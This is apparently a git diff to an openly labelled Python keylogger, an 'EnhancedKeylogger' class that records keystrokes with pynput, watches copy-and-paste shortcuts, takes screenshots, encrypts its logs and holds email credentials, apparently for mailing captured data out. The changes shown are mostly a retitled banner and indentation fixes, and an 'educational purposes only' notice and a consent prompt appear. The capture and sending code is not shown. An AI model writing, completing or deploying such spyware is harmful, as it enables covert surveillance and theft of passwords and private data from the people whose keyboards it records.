@@ -6,7 +6,7 @@
 #  ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║ ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
 #  ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝ ╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
 #  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
-#                                    KEYLOGGERS
+#                                    KEYLOGGER (Linux Edition)
 
 # ============================================================
 # ⚠️  FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT.
@@ -32,31 +32,30 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 class EnhancedKeylogger:
-   
-    def __init__(self, log_interval=300, screenshot_interval=60, 
-             from_email=None, password=None, to_email=None, 
-             encryption_key=None):
-    self.log = ""
-    self.log_interval = log_interval
-    self.screenshot_interval = screenshot_interval
-    self.from_email = from_email
-    self.password = password
-    self.to_email = to_email
-    self.pictures = []
-    self.mail = MIMEMultipart()
-    self.status = True
-    self.user = os.getenv("USER", "Unknown")
-    self.current_key_list = set()
-    self.COMBINATIONS = [
-        {keyboard.Key.ctrl, keyboard.KeyCode(char='c')},
-        {keyboard.Key.ctrl, keyboard.KeyCode(char='v')},
-        {keyboard.Key.ctrl, keyboard.KeyCode(char='x')}
-    ]
-    self.encryption_key = encryption_key or Fernet.generate_key()
-    self.fernet = Fernet(self.encryption_key)
-    self._setup_logging()
-    self._validate_config()
 
+    def __init__(self, log_interval=300, screenshot_interval=60,
+                 from_email=None, password=None, to_email=None,
+                 encryption_key=None):
+        self.log = ""
+        self.log_interval = log_interval
+        self.screenshot_interval = screenshot_interval
+        self.from_email = from_email
+        self.password = password
+        self.to_email = to_email
+        self.pictures = []
+        self.mail = MIMEMultipart()
+        self.status = True
+        self.user = os.getenv("USER", "Unknown")
+        self.current_key_list = set()
+        self.COMBINATIONS = [
+            {keyboard.Key.ctrl, keyboard.KeyCode(char='c')},
+            {keyboard.Key.ctrl, keyboard.KeyCode(char='v')},
+            {keyboard.Key.ctrl, keyboard.KeyCode(char='x')}
+        ]
+        self.encryption_key = encryption_key or Fernet.generate_key()
+        self.fernet = Fernet(self.encryption_key)
+        self._setup_logging()
+        self._validate_config()
 
     def _setup_logging(self):
         logging.basicConfig(
@@ -208,7 +207,7 @@ class EnhancedKeylogger:
         <hr>
         """
 
-       def start(self):
+    def start(self):
         try:
             consent = input("Do you have explicit consent to run this? (y/n): ")
             if consent.lower() != 'y':
@@ -226,7 +225,6 @@ class EnhancedKeylogger:
             logging.error(f"Runtime error: {e}")
         finally:
             logging.info("Keylogger session ended")
-
 
 if __name__ == "__main__":
     print("""
